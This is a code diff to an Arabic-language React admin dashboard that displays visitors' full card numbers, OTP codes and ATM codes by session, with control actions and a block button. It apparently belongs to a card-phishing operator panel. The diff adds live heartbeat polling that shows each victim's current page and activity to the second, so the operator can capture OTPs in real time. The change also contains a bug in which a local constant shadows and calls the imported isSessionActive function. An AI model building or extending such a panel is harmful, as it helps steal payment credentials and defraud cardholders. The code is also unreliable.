@@ -17,7 +17,19 @@ import {
   ChevronDown,
   ChevronUp,
   Activity,
+  Wifi,
 } from "lucide-react";
+
+// Import heartbeat tracking utilities
+import { 
+  useHeartbeatTracking, 
+  formatLiveTime, 
+  isSessionActive, 
+  getSecondsSincePing,
+  getPageName,
+  getLatestPing,
+  type PingData 
+} from "@/lib/heartbeat";
 
 interface SubmissionRow {
   id: number;
@@ -46,7 +58,75 @@ interface AttemptBlock {
 }
 
 const ATTEMPT_GAP_MS = 10 * 60 * 1000; // 10 minutes gap to split attempts
-const ACTIVE_THRESHOLD_MS = 5 * 60 * 1000; // 5 minutes to mark as active
+const ACTIVE_THRESHOLD_MS = 10 * 1000; // 10 seconds for real-time active check
+
+// Live counter hook - updates every second for real-time display
+function useLiveCounter(baseTimestamp: string | null) {
+  const [liveText, setLiveText] = useState<string>("");
+
+  useEffect(() => {
+    if (!baseTimestamp) {
+      setLiveText("");
+      return;
+    }
+
+    const updateLiveText = () => {
+      setLiveText(formatLiveTime(baseTimestamp));
+    };
+
+    // Update immediately
+    updateLiveText();
+
+    // Update every second
+    const interval = setInterval(updateLiveText, 1000);
+    return () => clearInterval(interval);
+  }, [baseTimestamp]);
+
+  return liveText;
+}
+
+// Live active badge component
+function LiveActiveBadge({ lastPing, currentPage }: { lastPing: string | null; currentPage?: string }) {
+  const [isActive, setIsActive] = useState(false);
+  const [secondsAgo, setSecondsAgo] = useState(0);
+
+  useEffect(() => {
+    if (!lastPing) {
+      setIsActive(false);
+      return;
+    }
+
+    const checkActive = () => {
+      const diff = Date.now() - new Date(lastPing).getTime();
+      setIsActive(diff <= ACTIVE_THRESHOLD_MS);
+      setSecondsAgo(Math.floor(diff / 1000));
+    };
+
+    checkActive();
+    const interval = setInterval(checkActive, 1000);
+    return () => clearInterval(interval);
+  }, [lastPing]);
+
+  if (isActive) {
+    return (
+      <span className="flex items-center gap-1">
+        <span className="w-2 h-2 rounded-full bg-green-500 animate-pulse" />
+        <span className="text-[10px] text-green-600 font-medium">
+          نشط الآن {currentPage ? `- في صفحة ${getPageName(currentPage)}` : ""}
+        </span>
+      </span>
+    );
+  }
+
+  return (
+    <span className="flex items-center gap-1">
+      <span className="w-2 h-2 rounded-full bg-slate-400" />
+      <span className="text-[10px] text-slate-500">
+        غير نشط {secondsAgo > 0 ? `(${secondsAgo}ث)` : ""}
+      </span>
+    </span>
+  );
+}
 
 function parseData(raw: string | null): Record<string, string> {
   if (!raw) return {};
@@ -55,6 +135,11 @@ function parseData(raw: string | null): Record<string, string> {
   } catch {
     return {};
   }
+}
+
+// Dynamic formatAgo with live counter
+function useFormatAgo(iso: string | null) {
+  return useLiveCounter(iso);
 }
 
 function formatAgo(iso: string) {
@@ -72,6 +157,7 @@ function formatTime(iso: string) {
   return new Date(iso).toLocaleString("ar-EG", {
     hour: "2-digit",
     minute: "2-digit",
+    second: "2-digit",
     day: "numeric",
     month: "short",
   });
@@ -206,11 +292,13 @@ function AttemptBlockCard({
   onControl,
   loadingAction,
   isLatest,
+  showOtpPlaceholder,
 }: {
   block: AttemptBlock;
   onControl: (action: string) => Promise<void>;
   loadingAction: string | null;
   isLatest: boolean;
+  showOtpPlaceholder?: boolean;
 }) {
   const cardData = block.card ? parseData(block.card.data) : null;
   const otpData = block.otp ? parseData(block.otp.data) : null;
@@ -219,6 +307,9 @@ function AttemptBlockCard({
   const formattedCard = cardData?.cardNumber
     ? cardData.cardNumber.replace(/(.{4})/g, "$1 ").trim()
     : "—";
+
+  // Live counter for block start time
+  const liveTimeText = useLiveCounter(block.startTime);
 
   return (
     <div className={`rounded-3xl border p-4 ${block.isActive ? "border-green-300 bg-green-50/50" : "border-slate-200 bg-white"}`}>
@@ -231,11 +322,14 @@ function AttemptBlockCard({
           {block.isActive && (
             <span className="flex items-center gap-1 text-xs text-green-600">
               <span className="w-2 h-2 rounded-full bg-green-500 animate-pulse" />
-              نشط الآن
+              نشط
             </span>
           )}
         </div>
-        <span className="text-xs text-slate-500" dir="ltr">{formatTime(block.startTime)}</span>
+        <div className="flex items-center gap-2 text-xs text-slate-500">
+          <Wifi className="w-3 h-3" />
+          <span dir="ltr">{liveTimeText}</span>
+        </div>
       </div>
 
       {/* Card Data */}
@@ -277,7 +371,8 @@ function AttemptBlockCard({
           <p className="text-xl font-bold font-mono text-blue-800" dir="ltr">{atmData?.atmCode ?? "—"}</p>
           <span className="text-xs text-blue-600 mt-1 block">{formatAgo(block.atm.createdAt)}</span>
         </div>
-      ) : isLatest ? (
+      ) : isLatest && block.card ? (
+        // Smart visibility: Only show placeholder for latest attempt with card but no OTP
         <div className="rounded-2xl border border-dashed border-orange-200 bg-orange-50/50 p-4 mb-3 text-center">
           <span className="text-sm text-orange-600">⏳ بانتظار إدخال رمز OTP لهذه البطاقة...</span>
         </div>
@@ -317,6 +412,8 @@ function SessionBox({
   rows,
   blocked,
   selected,
+  lastPing,
+  currentPage,
   onToggleSelect,
   onControl,
   onBlock,
@@ -328,6 +425,8 @@ function SessionBox({
   rows: SubmissionRow[];
   blocked?: string;
   selected: boolean;
+  lastPing?: string | null;
+  currentPage?: string;
   onToggleSelect: () => void;
   onControl: (sessionId: string, action: string) => Promise<void>;
   onBlock: () => void;
@@ -346,14 +445,15 @@ function SessionBox({
 
   // Group into attempt blocks
   const attemptBlocks = groupIntoAttemptBlocks(rows);
+
+  // Live counter for last activity
   const latestActivity = rows.length > 0 
     ? [...rows].sort((a, b) => new Date(b.createdAt).getTime() - new Date(a.createdAt).getTime())[0].createdAt 
     : null;
+  const liveActivityText = useLiveCounter(latestActivity);
 
-  // Check if session is active (within 5 minutes of last activity)
-  const isSessionActive = latestActivity 
-    ? Date.now() - new Date(latestActivity).getTime() < ACTIVE_THRESHOLD_MS 
-    : false;
+  // Check if session is active based on ping (within 10 seconds)
+  const isSessionActive = lastPing ? isSessionActive(lastPing) : false;
 
   const handleControl = async (action: string) => {
     setLoadingAction(action);
@@ -385,25 +485,16 @@ function SessionBox({
                   </div>
                   <div className="flex items-center gap-2 text-xs">
                     {latestActivity && (
-                      <span className="text-slate-400">{formatAgo(latestActivity)}</span>
+                      <span className="text-slate-400 flex items-center gap-1">
+                        <Activity className="w-3 h-3" />
+                        {liveActivityText}
+                      </span>
                     )}
                     {expanded ? <ChevronUp className="w-4 h-4" /> : <ChevronDown className="w-4 h-4" />}
                   </div>
                 </div>
                 <div className="mt-2 flex items-center justify-between gap-2">
-                  {blocked ? (
-                    <Badge className="bg-red-100 text-red-700 border-red-200 text-[10px]">محظور</Badge>
-                  ) : isSessionActive ? (
-                    <span className="flex items-center gap-1">
-                      <span className="w-2 h-2 rounded-full bg-green-500 animate-pulse" />
-                      <span className="text-[10px] text-green-600 font-medium">نشط الآن</span>
-                    </span>
-                  ) : (
-                    <span className="flex items-center gap-1">
-                      <span className="w-2 h-2 rounded-full bg-slate-400" />
-                      <span className="text-[10px] text-slate-500">غير نشط</span>
-                    </span>
-                  )}
+                  <LiveActiveBadge lastPing={lastPing ?? null} currentPage={currentPage} />
                   <span className="text-[11px] text-slate-400">#{sessionId.slice(0, 8)}</span>
                 </div>
               </button>
@@ -484,7 +575,50 @@ export default function AdminDashboard() {
   const [settings, setSettings] = useState(getAdminSettings());
   const [passwordValue, setPasswordValue] = useState("");
   const [passwordStatus, setPasswordStatus] = useState<string | null>(null);
+  const [sessionPings, setSessionPings] = useState<Record<string, PingData>>({});
   const intervalRef = useRef<number | null>(null);
+  const pingsIntervalRef = useRef<number | null>(null);
+
+  // Fetch pings for all sessions
+  const fetchPings = useCallback(async () => {
+    const supabaseUrl = import.meta.env.VITE_SUPABASE_URL;
+    const supabaseKey = import.meta.env.VITE_SUPABASE_ANON_KEY;
+    
+    if (!supabaseUrl || !supabaseKey) return;
+
+    try {
+      // Get all pings, ordered by session and time
+      const response = await fetch(
+        `${supabaseUrl}/rest/v1/pings?select=*&order=last_ping.desc`,
+        {
+          headers: {
+            'apikey': supabaseKey,
+            'Authorization': `Bearer ${supabaseKey}`,
+          },
+        }
+      );
+
+      if (!response.ok) return;
+
+      const data = await response.json();
+      
+      // Get the latest ping for each session
+      const latestPings: Record<string, PingData> = {};
+      for (const ping of data || []) {
+        if (!latestPings[ping.session_id]) {
+          latestPings[ping.session_id] = {
+            session_id: ping.session_id,
+            current_page: ping.current_page,
+            last_ping: ping.last_ping,
+          };
+        }
+      }
+      
+      setSessionPings(latestPings);
+    } catch (error) {
+      console.error("Failed to fetch pings:", error);
+    }
+  }, []);
 
   const sessions = useMemo(() => {
     const trashedIds = new Set(trashItems.map((item) => item.id));
@@ -512,6 +646,21 @@ export default function AdminDashboard() {
       setLocation("/admin");
     }
   }, [setLocation]);
+
+  // Start heartbeat tracking for admin (read-only)
+  useEffect(() => {
+    // Poll pings every 3 seconds for real-time updates
+    void fetchPings();
+    pingsIntervalRef.current = window.setInterval(() => {
+      void fetchPings();
+    }, 3000);
+    
+    return () => {
+      if (pingsIntervalRef.current) {
+        window.clearInterval(pingsIntervalRef.current);
+      }
+    };
+  }, [fetchPings]);
 
   const fetchData = useCallback(async () => {
     const token = getToken();
@@ -783,6 +932,8 @@ export default function AdminDashboard() {
                     sessionId={sessionId}
                     rows={rows}
                     selected={selectedIds.includes(sessionId)}
+                    lastPing={sessionPings[sessionId]?.last_ping}
+                    currentPage={sessionPings[sessionId]?.current_page}
                     onToggleSelect={() => {
                       setSelectedIds((current) => current.includes(sessionId)
                         ? current.filter((id) => id !== sessionId)
